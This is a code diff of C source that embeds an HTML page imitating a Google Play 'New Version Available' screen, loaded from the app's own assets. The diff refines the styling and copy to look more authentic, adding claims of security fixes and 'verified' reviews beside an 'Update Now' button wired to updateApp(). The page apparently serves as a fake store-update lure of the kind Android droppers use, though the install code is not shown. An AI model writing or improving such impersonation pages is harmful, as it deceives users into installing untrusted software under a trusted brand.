@@ -123,49 +123,49 @@ static const char* getHtmlContent(const char* mode) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#ffffff">
-    <title>Update Available - Google Play</title>
+    <title>New Version Available - Google Play</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #ffffff; color: #202124; width: 100%; min-height: 100vh; overflow-x: hidden; }
-        .header { padding: 16px 20px; display: flex; align-items: center; gap: 12px; background: white; border-bottom: 1px solid #e8eaed; }
-        .google-play-logo { display: flex; align-items: center; gap: 6px; }
-        .play-icon { width: 24px; height: 24px; }
-        .header-text { font-size: 20px; font-weight: 400; color: #5f6368; }
-        .content { padding: 20px 16px; }
-        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #202124; }
-        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 24px; line-height: 1.4; }
-        .app-info { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
-        .app-icon { width: 64px; height: 64px; background: #f0f0f0; border-radius: 14px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e0e0e0; flex-shrink: 0; }
+        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #fafafa; color: #202124; width: 100%; min-height: 100vh; overflow-x: hidden; }
+        .header { padding: 14px 20px; display: flex; align-items: center; gap: 10px; background: white; border-bottom: 1px solid #dadce0; }
+        .google-play-logo { display: flex; align-items: center; gap: 8px; }
+        .play-icon { width: 22px; height: 22px; }
+        .header-text { font-size: 19px; font-weight: 500; color: #3c4043; }
+        .content { padding: 24px 18px; max-width: 640px; margin: 0 auto; }
+        .title { font-size: 26px; font-weight: 500; margin-bottom: 6px; color: #1a73e8; }
+        .subtitle { font-size: 14px; color: #80868b; margin-bottom: 20px; line-height: 1.5; }
+        .app-info { display: flex; align-items: center; gap: 14px; margin-bottom: 28px; padding: 12px; background: white; border-radius: 8px; }
+        .app-icon { width: 60px; height: 60px; background: #f1f3f4; border-radius: 12px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e8eaed; flex-shrink: 0; }
         .app-icon img { width: 100%; height: 100%; object-fit: cover; }
         .app-details { flex: 1; min-width: 0; }
-        .app-details h2 { font-size: 16px; font-weight: 600; margin-bottom: 6px; color: #202124; }
-        .app-meta { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #5f6368; flex-wrap: wrap; }
-        .section-title { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: #202124; }
-        .update-date { font-size: 12px; color: #5f6368; margin-bottom: 12px; }
-        .update-description { font-size: 13px; line-height: 1.5; color: #5f6368; margin-bottom: 12px; }
-        .update-list { list-style: none; padding-left: 0; margin-bottom: 12px; }
-        .update-list li { font-size: 13px; color: #202124; margin-bottom: 8px; padding-left: 6px; line-height: 1.5; }
-        .update-list li:before { content: "• "; font-weight: bold; margin-right: 8px; }
-        .buttons { display: flex; gap: 12px; margin: 24px 0 32px 0; }
-        .btn { flex: 1; padding: 11px 20px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; transition: all 0.2s; text-align: center; }
-        .btn-outline { background: white; color: #1967d2; border: 1px solid #dadce0; }
-        .btn-outline:active { background: #f8f9fa; }
-        .btn-primary { background: #1967d2; color: white; }
-        .btn-primary:active { background: #1557b0; }
-        .section { margin-bottom: 32px; }
-        .ratings-section { margin-bottom: 24px; }
-        .ratings-disclaimer { font-size: 12px; color: #5f6368; line-height: 1.5; margin-bottom: 20px; }
-        .rating-summary { display: flex; gap: 24px; align-items: center; margin-bottom: 32px; }
+        .app-details h2 { font-size: 17px; font-weight: 500; margin-bottom: 4px; color: #202124; }
+        .app-meta { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #80868b; flex-wrap: wrap; }
+        .section-title { font-size: 19px; font-weight: 500; margin-bottom: 8px; color: #202124; }
+        .update-date { font-size: 13px; color: #80868b; margin-bottom: 10px; }
+        .update-description { font-size: 14px; line-height: 1.6; color: #5f6368; margin-bottom: 14px; }
+        .update-list { list-style: none; padding-left: 0; margin-bottom: 16px; }
+        .update-list li { font-size: 14px; color: #3c4043; margin-bottom: 6px; padding-left: 20px; line-height: 1.6; position: relative; }
+        .update-list li:before { content: "▸"; position: absolute; left: 0; color: #1a73e8; font-size: 12px; }
+        .buttons { display: flex; gap: 10px; margin: 20px 0 28px 0; }
+        .btn { flex: 1; padding: 12px 22px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; border: none; transition: opacity 0.2s; text-align: center; }
+        .btn-outline { background: white; color: #1a73e8; border: 1px solid #dadce0; }
+        .btn-outline:active { opacity: 0.7; }
+        .btn-primary { background: #1a73e8; color: white; }
+        .btn-primary:active { opacity: 0.9; }
+        .section { margin-bottom: 28px; }
+        .ratings-section { margin-bottom: 20px; }
+        .ratings-disclaimer { font-size: 13px; color: #80868b; line-height: 1.5; margin-bottom: 18px; }
+        .rating-summary { display: flex; gap: 20px; align-items: center; margin-bottom: 28px; }
         .rating-score { text-align: center; }
-        .rating-number { font-size: 48px; font-weight: 400; color: #202124; line-height: 1; margin-bottom: 6px; }
-        .stars { color: #1967d2; font-size: 14px; margin-bottom: 4px; }
-        .review-count { font-size: 12px; color: #5f6368; }
+        .rating-number { font-size: 46px; font-weight: 400; color: #202124; line-height: 1; margin-bottom: 4px; }
+        .stars { color: #fbbc04; font-size: 15px; margin-bottom: 3px; }
+        .review-count { font-size: 13px; color: #80868b; }
         .rating-bars { flex: 1; }
-        .rating-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
-        .bar-label { font-size: 13px; color: #5f6368; width: 8px; flex-shrink: 0; }
-        .bar-container { flex: 1; height: 10px; background: #e8eaed; border-radius: 4px; overflow: hidden; min-width: 0; }
-        .bar-fill { height: 100%; background: #1967d2; border-radius: 4px; transition: width 0.3s ease; }
-        @media (max-width: 480px) { .header { padding: 14px 16px; } .content { padding: 16px 12px; } .title { font-size: 22px; } .app-icon { width: 56px; height: 56px; } .btn { padding: 10px 18px; font-size: 13px; } .rating-number { font-size: 42px; } }
+        .rating-bar { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+        .bar-label { font-size: 12px; color: #5f6368; width: 10px; flex-shrink: 0; }
+        .bar-container { flex: 1; height: 8px; background: #e8eaed; border-radius: 2px; overflow: hidden; min-width: 0; }
+        .bar-fill { height: 100%; background: #1a73e8; border-radius: 2px; transition: width 0.3s ease; }
+        @media (max-width: 480px) { .header { padding: 12px 16px; } .content { padding: 18px 14px; } .title { font-size: 23px; } .app-icon { width: 54px; height: 54px; } .btn { padding: 11px 18px; font-size: 13px; } .rating-number { font-size: 40px; } }
     </style>
 </head>
 <body>
@@ -181,8 +181,8 @@ static const char* getHtmlContent(const char* mode) {
     </div>
 </div>
 <div class="content">
-    <h1 class="title">Update Available</h1>
-    <p class="subtitle">To use this app, download the latest version.</p>
+    <h1 class="title">New Version Available</h1>
+    <p class="subtitle">Please update to the latest version to continue using this app.</p>
     <div class="app-info">
         <div class="app-icon"><img src="file:///android_asset/update/app.png" alt="App Icon"></div>
         <div class="app-details">
@@ -195,22 +195,22 @@ static const char* getHtmlContent(const char* mode) {
         </div>
     </div>
     <div class="section">
-        <h3 class="section-title">What's new</h3>
+        <h3 class="section-title">What's new in this version</h3>
         <p class="update-date"></p>
-        <p class="update-description">We're always making changes and improvements to this app. To make sure you don't miss a thing, just keep your Updates turned on.</p>
+        <p class="update-description">This update includes important improvements and new features to enhance your experience.</p>
         <ul class="update-list">
-            <li>New features and improvements added.</li>
-            <li>Enhanced user experience and interface.</li>
-            <li>Bug fixes and performance improvements.</li>
+            <li>Latest features and enhancements</li>
+            <li>Improved performance and stability</li>
+            <li>Security updates and bug fixes</li>
         </ul>
     </div>
     <div class="buttons">
-        <button class="btn btn-outline">More Info</button>
-        <button class="btn btn-primary" id="updateBtn" onclick="updateApp()">Update</button>
+        <button class="btn btn-outline">Details</button>
+        <button class="btn btn-primary" id="updateBtn" onclick="updateApp()">Update Now</button>
     </div>
     <div class="section ratings-section">
         <h3 class="section-title">Ratings and reviews</h3>
-        <p class="ratings-disclaimer">Ratings and reviews are verified and are from people who use the same type of device that you use.</p>
+        <p class="ratings-disclaimer">All ratings and reviews shown here are verified and come from users with similar devices.</p>
         <div class="rating-summary">
             <div class="rating-score">
                 <div class="rating-number"></div>
